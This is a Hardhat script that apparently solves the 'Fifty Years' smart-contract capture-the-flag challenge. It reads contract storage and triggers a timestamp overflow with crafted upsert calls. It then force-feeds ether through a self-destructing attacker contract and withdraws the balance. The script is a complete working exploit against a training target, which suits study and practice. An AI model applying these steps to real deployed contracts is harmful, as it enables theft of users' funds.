import { ethers } from 'hardhat';
const { utils, BigNumber, provider, constants } = ethers;

const address = '0x5477edca380644056F7a77BDA296C086957f8FA1';

async function main() {
  // const [owner] = await ethers.getSigners();

  console.log('getting factories');
  const [targetFactory, attackerFactory] = await Promise.all([
    ethers.getContractFactory('FiftyYearsChallenge'),
    ethers.getContractFactory('FiftyYearsChallengeAttacker'),
  ]);

  console.log('compiling contracts');
  const [target, attacker] = await Promise.all([
    /*
    targetFactory.deploy(owner.address, {
      value: utils.parseEther('1'),
    }),
    */
    // COMMENT NEXT LINE AND UNCOMMENT THE TWO COMMENTED BLOCKS FOR LOCAL TESTING
    targetFactory.attach(address),
    attackerFactory.deploy(),
  ]);

  console.log('target deployed to:', target.address);
  console.log('attacker deployed to:', attacker.address);

  console.log('getting timestamp');
  const arraySlotPosition = utils.hexlify(utils.hexZeroPad(BigNumber.from(0).toHexString(), 32));
  const firstArrayItemPosition = utils.keccak256(arraySlotPosition);
  const unlockTimestamp = await provider.getStorageAt(
    target.address,
    BigNumber.from(firstArrayItemPosition).add(1).toHexString()
  );

  console.log('old timestamp', unlockTimestamp);

  const newUnlockTimestamp = constants.MaxUint256.sub(60 * 60 * 24 - 1);

  console.log('new timestamp', newUnlockTimestamp);

  let tx;

  console.log('creating new contribution');
  tx = await target.upsert(1, newUnlockTimestamp.toString(), {
    value: '1',
  });
  await tx.wait();

  console.log('creating contribution with timestamp 0');
  tx = await target.upsert(2, 0, {
    value: '2',
  });
  await tx.wait();

  console.log('send the difference using the suicide attacker');
  tx = await attacker.seppuku(target.address, {
    value: 2,
  });

  console.log('withdraw');
  tx = await target.withdraw(2);
  await tx.wait();

  console.log('target balance', utils.formatEther(await provider.getBalance(target.address)));
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
